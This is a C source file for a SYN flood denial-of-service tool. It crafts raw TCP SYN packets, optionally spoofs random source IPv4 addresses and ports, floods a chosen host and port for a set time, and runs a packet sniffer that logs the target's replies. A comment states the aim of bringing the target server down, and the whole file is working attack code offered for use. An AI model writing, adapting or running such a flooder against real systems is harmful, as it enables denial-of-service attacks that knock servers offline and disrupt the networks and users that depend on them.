#include "synflood.h"

bool attack = true;
bool verbose = false;
bool use_spoofing = false;
struct in_addr current_ipv4_addr;
char usage_message[] = "Usage: synflood [-h | --hostname] HOSTNAME [-p | --port] PORT \n\
Optional parameters:\n\
  -v                          Enable verbose mode \n\
  -t. --attack-time [time]    The number of seconds to launch the attack for.\n\
                              Must be a positive integer less than 120 seconds.\n\
  --no-sniff                  Disable the packet sniffer.\n\
  --enable-spoofing           Enable random IPv4 address spoofing. Not recommended\n\
                              since more often than not these packets would be dropped\n\
                              by the network at some point or the other.\n";


void
sigalrm_handler (int signo)
{
  attack = false;
}


void
sigterm_handler (int signo)
{
  exit(EXIT_SUCCESS);
}


/**
 * Seed the random number generator using /dev/urandom. See random(7) for more details.
 */
void
seedRandomNumberGenerator ()
{
  unsigned int seed;
  ssize_t bytes_read = getrandom(&seed, sizeof(unsigned int), 0);
  if (bytes_read == -1) {
    fprintf(stderr, "%d: Failed to initialize the random number generator. %s.\n", __LINE__ - 2, strerror(errno));
    exit(EXIT_FAILURE);
  }
  srand(seed);
}


int
main (int argc, char *argv[], char *envp[])
{
  vlog("synflood process started [pid: %d].\n", getpid());

  /* Register the signal handlers. */
  signal(SIGALRM, sigalrm_handler);
  signal(SIGTERM, sigterm_handler);

  seedRandomNumberGenerator();

  /* Set the process group so that we may later kill all processes
   * that this process will fork (this process included) on encountering
   * a critical error. */
  if (setpgid(0, 0) == -1)
    die("%d: %s", __LINE__ - 1, strerror(errno));

  /* Parse the command line arguments. */
  pid_t pid;
  bool no_sniff;
  unsigned short int port;
  unsigned int attack_time;
  struct sockaddr_in host_addr;
  char hostname[HOSTNAME_BUFFER_LENGTH];
  getOptions(argc, argv, hostname, &port, &host_addr, &attack_time, &no_sniff);
  current_ipv4_addr = getCurrentIpAddr();
  char current_ipv4_addr_buf[32];
  strcpy(current_ipv4_addr_buf, inet_ntoa(current_ipv4_addr));
  vlog("Initialized synflood with:\n\
  target hostname:        %s\n\
  target address:         %s\n\
  target port:            %d\n\
  attack time:            %u %s\n\
  sniffer:                %s\n\
  spoofing:               %s\n\
  own address:            %s\n",
       hostname, inet_ntoa(host_addr.sin_addr), port, attack_time,
       attack_time == 1 ? "second" : "seconds", no_sniff ? "disabled" : "enabled",
       use_spoofing ? "enabled" : "disabled", current_ipv4_addr_buf);

  if (!no_sniff) {
    pid = fork();
    if (pid == 0)
      sniff(hostname, port);
  }

  vlog("Commencing attack in %d %s.\n", SUSPENSE_TIME, SUSPENSE_TIME == 1 ? "second" : "seconds");
  sleep(SUSPENSE_TIME);

  alarm(attack_time);
  synflood(hostname, port, host_addr);
  
  /* It seems like pcap spawns some kind of weird daemon or regular child process that we can't
   * wait on and kill normally. So take down the entire process group! */
  if (killpg(0, SIGTERM) == -1)
    fprintf(stderr, "%d: %s.\n", __LINE__ - 1, strerror(errno));
  
  return EXIT_SUCCESS;
}


/**
 * A utility function to print the specified formatted message to stdout
 * if only if verbose mode is set to true.
*/
void
vlog (const char format_string[], ...)
{
  if (verbose == false)
    return;

  va_list args;
  va_start(args, format_string);
  vfprintf(stdout, format_string, args);
  va_end(args);
  fflush(stdout);
}


/**
 * A utility function to print the specified formatted message to stderr,
 * flush both stdout and stderr, then terminate all processes in the
 * current process group.
*/
__attribute__((noreturn)) void
die (const char format_string[], ...)
{
  va_list args;
  va_start(args, format_string);
  vfprintf(stderr, format_string, args);
  va_end(args);

  fflush(stdout);
  fflush(stderr);

  if (killpg(0, SIGTERM) == -1)
    fprintf(stderr, "%d: %s.\n", __LINE__ - 1, strerror(errno));

  exit(errno);
}


/**
 * A simple utility function to dump some memory in a readable hex format.
*/
void
hexDump (void *ptr, ssize_t len)
{
  if (len == -1 || len == 0) {
    printf("00\n");
    return;
  }

  unsigned char *_ptr = (unsigned char *) ptr;
  for (int i = 0; i < len; ++i) {
    printf("%02x  ", *_ptr);
    ++_ptr;
  }
  printf("\n");
}


/**
 * Parse the command line options and represent them in a way we can manipulate and use.
*/
void
getOptions (int argc, char *argv[], char hostname[HOSTNAME_BUFFER_LENGTH],
            unsigned short int *port, struct sockaddr_in *host_addr,
            unsigned int *attack_time, bool *no_sniff)
{
  int opt = 0;
  char *hostname_placeholder;
  bool hostname_initialized = false, port_initialized = false;

  *attack_time = DEFAULT_ATTACK_TIME;
  *no_sniff = false;

  struct option option_array[] = {
      {"help", no_argument, NULL, (int) 'H'},
      {"hostname", required_argument, NULL, (int) 'h'},
      {"port", required_argument, NULL,  (int) 'p'},
      {"verbose", no_argument, NULL, (int) 'v'},
      {"attack-time", required_argument, NULL,  (int) 't'},
      {"no-sniff", no_argument, NULL, (int) 's'},
      {"enable-spoofing", no_argument, NULL, (int) 'e'},
      {0, 0, 0, 0}
  };

  opt = getopt_long(argc, argv, "h:p:vt:", option_array, NULL);
  while (opt != -1) {
    switch (opt) {
      case 'h':
        hostname_placeholder = optarg;
        hostname_initialized = true;
        break;

      case 'p':
        *port = validatePort(optarg);
        port_initialized = true;
        break;

      case 'v':
        verbose = true;
        break;

      case 't':
        *attack_time = validateAttackTime(optarg);
        break;

      case 's':
        *no_sniff = true;
        break;

      case 'e':
        use_spoofing = true;
        break;

      case 'H':
        fprintf(stderr, "%s", usage_message);
        exit(EXIT_SUCCESS);

      default:
        fprintf(stderr, "%s", usage_message);
        exit(EXIT_FAILURE);
    }
    opt = getopt_long(argc, argv, "h:p:vt:", option_array, NULL);
  }

  if (!(hostname_initialized && port_initialized)) {
      fprintf(stderr, "%s", usage_message);
      exit(EXIT_FAILURE);
  }

  if (!validateHostname(hostname_placeholder, hostname, *port, host_addr)) {
    fprintf(stderr, "Invalid hostname.\n");
    exit(EXIT_FAILURE);
  }

  return;
}

/**
 * Validate the given port number string and then return it's unsigned integer value.
*/
unsigned short int
validatePort (const char *inp)
{
  int port_no;
  bool invalid_port_no = false;
  size_t slen = strlen(inp);

  for (int i = 0; i < slen; ++i) {
    if (isdigit(inp[i]))
      continue;
    invalid_port_no = true;
    break;
  }

  if (!invalid_port_no) {
    port_no = atoi(inp);
    if (port_no > 65535 || port_no < 0)
      invalid_port_no = true;
  }

  if (invalid_port_no) {
    fprintf(stderr, "Invalid port.\n");
    exit(EXIT_FAILURE);
  }

  return (unsigned short int) port_no;
}


/**
 * Validate the input and populate the hostname string. Also perform a DNS lookup of the given
 * hostname and populate host_addr.
 * @returns     true if the hostname is valid and exists. false otherwise.
*/
bool
validateHostname (const char *inp, char hostname[HOSTNAME_BUFFER_LENGTH],
                  unsigned short int port, struct sockaddr_in *host_addr)
{
  if (strlen(inp) > HOSTNAME_BUFFER_LENGTH)
    return false;

  memset(hostname, (int)'\0', HOSTNAME_BUFFER_LENGTH);
  strncpy(hostname, inp, HOSTNAME_BUFFER_LENGTH-1);

  vlog("Performing hostname lookup... ");
  resolveHostName(hostname, port, host_addr);

  return true;
}


/**
 * Make sure that the attack time is positive and not longer than 2 minutes.
*/
unsigned int
validateAttackTime (char *inp)
{
  bool invalid = false;
  
  size_t inplen = strlen(inp);
  for (int i = 0; i < inplen; ++i) {
    if (!isdigit(inp[i])) {
      invalid = true;
      break;
    }
  }

  int attack_time = atoi(inp);
  if (attack_time > 120)
    invalid = true;

  if (invalid) { 
    fprintf(stderr, "Invalid attack time: %s.\n", inp);
    exit(EXIT_FAILURE);
  }

  return (unsigned int) attack_time;
}


/**
 * Use gethostbyname() to perform a DNS lookup and then move through the entries in a linear
 * manner, trying to form a TCP connection with each IP address. When we are able to successfully
 * form a TCP connection, close it, populate the address, and return.
*/
void
resolveHostName(char *hostname, unsigned short int port, struct sockaddr_in *addr)
{
  int sockfd;
  char **hptr;
  char buf[HOSTNAME_BUFFER_LENGTH];

  addr->sin_family = AF_INET;
  addr->sin_port = htons(port);

  struct hostent *host = gethostbyname(hostname);
  if (host == NULL)
    die("%d: Failed to resolve host %s: %s.\n", __LINE__ - 2, hostname, hstrerror(h_errno));

  if (host->h_addrtype != AF_INET)
    die("%d: Failed to find IPv4 records for the host: %s.\n", __LINE__ - 1, strerror(errno));

  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sockfd == -1)
    die("%d: Failed to open hostname resolver checker socket: %s.\n", __LINE__ - 2, strerror(errno));

  for (hptr = host->h_addr_list; *hptr != NULL; ++hptr) {
    inet_ntop(host->h_addrtype, *hptr, buf, HOSTNAME_BUFFER_LENGTH);
    memset(&addr->sin_addr, 0, sizeof(struct in_addr));
    addr->sin_addr.s_addr = inet_addr(buf);
    if (connect(sockfd, (struct sockaddr *) addr, sizeof(struct sockaddr_in)) == -1)
      continue;
    close(sockfd);
    vlog("%s\n", buf);
    return;
  }

  die("Failed to perform a successful hostname lookup.\n");
}


/**
 * First create a raw socket and tell the kernel that we'll be including
 * the IP and TCP headers ourselves and that no non-link layer headers
 * should be prepended by the kernel.
*/
int
getRawSocket ()
{
  int on = 1;
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sockfd == -1) {
    if (errno == EPERM)
      die("%d: must be root to open raw sockets.\n", __LINE__ - 3);
    die("%d: %s\n", __LINE__ - 4, errno, strerror(errno));
  }
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
    die("%s: %d\n", __LINE__ - 1, strerror(errno));
  return sockfd;
}


/**
 * Bring down the target (host) server with a flood of TCP SYN packets
 * with spoofed IP addresses.
*/
void
synflood (char *hostname, unsigned int port, struct sockaddr_in host_addr)
{
  int sockfd = getRawSocket();

  uint8_t packet[PACKET_BUFFER_LEN];
  struct iphdr *ip_headers = (struct iphdr *) packet;
  struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);

  while (attack) {
    /* Because we want to spoof the IP address and port number of each packet, we will need to
     * reconstruct the packet each time we want to send one. */
    setIpHeaders(ip_headers, &host_addr.sin_addr);
    setTcpHeaders(tcp_headers, host_addr.sin_port);
    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
    if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
      die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
    memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
  }
}


/**
 * Get the current IP address being used.
*/
struct in_addr
getCurrentIpAddr ()
{
  struct in_addr ip_addr;
  struct sockaddr_in *addr = NULL;
  struct ifaddrs *addrs, *cur_addr;
  if (getifaddrs(&addrs) == -1)
    die("%d: Failed to get the current IP address: %s\n", __LINE__ - 1, strerror(errno));

  cur_addr = addrs;
  while (cur_addr) {
      if (cur_addr->ifa_addr
            && cur_addr->ifa_addr->sa_family == AF_INET
            && strcmp(cur_addr->ifa_name, "wlo1") == 0) {
          addr = (struct sockaddr_in *) cur_addr->ifa_addr;
          if (addr != NULL)
            ip_addr = addr->sin_addr;
          break;
      }

      cur_addr = cur_addr->ifa_next;
  }

  freeifaddrs(addrs);

  if (addr == NULL)
    die("Failed to determine current IP address for the wlo1 interface.\n");

  return ip_addr;
}


/**
 * This is a REALLY simple and dumb function to generate a fake IPv4 address. The main problem
 * with this generator is that it may also generate addresses like 127.0.0.1 and 255.255.255.255
 * and in general this function does not adhere to special use addresses like the ones mentioned
 * in https://en.wikipedia.org/wiki/IPv4#Special-use_addresses.
 * But since almost all VPS providers (like DigitalOcean, AWS, GCP, Azure, etc.) block
 * spoofed IP packets from being sent from one of their servers, and since household routers can
 * only support oh so much traffic before crashing, I didn't waste much time on this function.
 * With the amount of anti-spoofing measures being taken on the internet, trying to spoof is
 * just a bad idea.
*/
in_addr_t
getSpoofedIpAddr ()
{
  unsigned int spoofed_parts[4];
  for (int i = 0; i < 4; ++i)
    spoofed_parts[i]= random() % 256;
 
  char spoofed_source_address[17];
  memset(spoofed_source_address, (int) '\0', 17);
  sprintf(spoofed_source_address, "%u.%u.%u.%u", spoofed_parts[0], spoofed_parts[1],
          spoofed_parts[2], spoofed_parts[3]);

  return inet_addr(spoofed_source_address);
}


/**
 * Get a random ephemeral port number.
*/
uint16_t
getSpoofedPortNumber ()
{
  return (random() % (65535 - 32768 + 1)) + 32768;
}


void
setIpHeaders (struct iphdr *ip_headers, struct in_addr *hin_addr)
{
  ip_headers->ihl = 0x5;
  ip_headers->version = 0x4;
  ip_headers->tos = 0x00;
  ip_headers->tot_len = 0x00;     /* Will be set by the kernel. See raw(7). */
  ip_headers->id = 0x00;          /* Will be set by the kernel. See raw(7). */
  ip_headers->frag_off = 0x0040;  /* Don't fragment. */
  ip_headers->ttl = 0x40;         /* 0d64 */
  ip_headers->protocol = 0x06;
  ip_headers->check = 0x0000;     /* Will be set by the kernel. See raw(7). */
  /* Can't wait for the kernel because need to compute the checksum ourselves. */
  ip_headers->saddr = use_spoofing ? getSpoofedIpAddr() : current_ipv4_addr.s_addr;
  ip_headers->daddr = hin_addr->s_addr;
}


void
setTcpHeaders (struct tcphdr *tcp_headers, in_port_t port)
{
  tcp_headers->th_sport = htons(getSpoofedPortNumber());
  tcp_headers->th_dport = port;
  tcp_headers->th_seq = htonl(random());
  tcp_headers->th_ack = 0x0000;
  tcp_headers->th_x2 = 0x0;
  tcp_headers->th_off = 0x5;
  tcp_headers->th_flags = TH_SYN;
  tcp_headers->th_win = htons(64240);
  tcp_headers->th_sum = 0x00;   /* We will need to construct a pseudo header and compute this later. */
  tcp_headers->th_urp = 0x00;
}


/**
 * TCP uses a special checksum algorithm whereby the checksum is not only calculated
 * over the bytes of the TCP data but it also includes some network layer (IP) data.
 * A 12-bytes "pseudo-checksum" is created and temporarily prepended to the TCP segment
 * for the sake of checksum calculation.
 * See pages 774-777 of "The TCP-IP Guide by Charles M. Kozierok (2005)" for more
 * information. Also see https://tools.ietf.org/html/rfc1071 for the algorithm.
 * Note: in our given scenario, there will never be an "odd byte".
*/
uint16_t
pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers)
{
  uint16_t chksum_buffer[sizeof(tcp_pseudo_header_t)];

  /* First populate the pseudo header. */
  tcp_pseudo_header_t *pheader = (tcp_pseudo_header_t *) chksum_buffer;
  pheader->saddr = ip_headers->saddr;
  pheader->daddr = ip_headers->daddr;
  pheader->proto = ip_headers->protocol;
  pheader->rsvd = 0x0;
  pheader->seglen = htons(20);
  memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr));

  /* Now compute the checksum following the steps listed in the RFC. */
  long chksum = 0;
  uint16_t *ptr = chksum_buffer;
  size_t count = sizeof(tcp_pseudo_header_t);
  while (count > 1) {
    chksum += *ptr;
    ++ptr;
    count -= 2;
  }
  if (count == 1)
    chksum += *(uint8_t *)ptr;

  chksum = (chksum >> 16) + (chksum & 0xffff);
  chksum = chksum + (chksum >> 16);
  chksum = ~chksum;
  return (uint16_t) chksum;
}


char *
getDefaultDevice ()
{
  char *dev, errbuf[PCAP_ERRBUF_SIZE];
  dev = pcap_lookupdev(errbuf);
  if (dev == NULL)
    die("%d: Couldn't find default device: %s\n", __LINE__ - 2, errbuf);
  return dev;
}


pcap_t *
getDeviceHandle (char *dev)
{
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t *handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
	if (handle == NULL)
	  die("%d: Couldn't open device %s: %s\n", __LINE__ - 2, dev, errbuf);
  return handle;
}


void
setFilterOnDeviceHandle (char *dev, pcap_t *handle, const char *filter_expr)
{
  bpf_u_int32 netmask, dev_ip;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program compiled_filter;

  if (pcap_lookupnet(dev, &dev_ip, &netmask, errbuf) == -1) {
	  fprintf(stderr, "Can't get netmask for device %s\n", dev);
	  dev_ip = 0;
	  netmask = 0;
	}

  if (pcap_compile(handle, &compiled_filter, filter_expr, 1, dev_ip) == -1)
    die("%d: Couldn't parse filter %s: %s\n", __LINE__ - 1, filter_expr, pcap_geterr(handle));

  if (pcap_setfilter(handle, &compiled_filter) == -1)
    die("%d: Couldn't install filter %s: %s\n", __LINE__ - 1, filter_expr, pcap_geterr(handle));

  pcap_freecode(&compiled_filter);
}


/**
 * The callback function that's supposed to be passed to the pcap_loop function call.
 * Simply print basic data about the packet received. It is assumed that we are dealing
 * with a wireless transmission of TCP packets.
*/
void
packetHandlerCallback (unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet)
{
  struct iphdr *ip_headers = (struct iphdr *)(packet + ETHERNET_HEADERS_LEN);
  unsigned int ip_headers_len = ip_headers->ihl * 4;
  struct tcphdr *tcp_headers = (struct tcphdr *)(packet + ETHERNET_HEADERS_LEN + ip_headers_len);

  bool is_syn = (tcp_headers->th_flags & TH_SYN) == TH_SYN;
  bool is_ack = (tcp_headers->th_flags & TH_ACK) == TH_ACK;
  char *pkt_type;
  if (is_syn && is_ack)
    pkt_type = "SYN-ACK";
  else if (is_syn)
    pkt_type = "SYN";
  else if (is_ack)
    pkt_type = "ACK";
  else
    pkt_type = "???";

  unsigned short int src_port = ntohs(tcp_headers->th_sport);
  unsigned short int dst_port = ntohs(tcp_headers->th_dport);

  char src_addr_str[HOSTNAME_BUFFER_LENGTH], dst_addr_str[HOSTNAME_BUFFER_LENGTH];

  if (inet_ntop(AF_INET, &(ip_headers->saddr), src_addr_str, HOSTNAME_BUFFER_LENGTH) == NULL)
    die("Failed to convert source address to ASCII: %s\n", strerror(errno));

  if (inet_ntop(AF_INET, &(ip_headers->daddr), dst_addr_str, HOSTNAME_BUFFER_LENGTH) == NULL)
    die("Failed to convert destination address to ASCII: %s\n", strerror(errno));
  
  printf("%s:%hu -> %s:%hu %10s\n", src_addr_str, src_port, dst_addr_str, dst_port, pkt_type);
}


void
sniff (char *hostname, int port)
{
  char filter_expr[1024];
  memset(filter_expr, (int) '\0', 1024);
  sprintf(filter_expr, FILTER_EXPR_TEMPLATE, hostname, port);
  vlog("Sniffing using filter expression:\n\"%s\"\n", filter_expr);

  char *dev = getDefaultDevice();
  pcap_t *handle = getDeviceHandle(dev);
  setFilterOnDeviceHandle(dev, handle, filter_expr);

  int llh_type = pcap_datalink(handle);
  if (llh_type != LINKTYPE_ETHERNET) {
    pcap_close(handle);
    errno = -1;
    die("Unsupported device: %s. Packets captured on the device won't be represented \
with ethernet type link layer headers using libpcap (see pcap-linktype(7)).\n", dev);
  }

  if (pcap_loop(handle, -1, packetHandlerCallback, NULL) == -1) {
    pcap_close(handle);
    errno = -1;
    die("Main packet capture loop failed: %s\n", pcap_geterr(handle));
  }

  pcap_close(handle);
  exit(EXIT_SUCCESS);
}

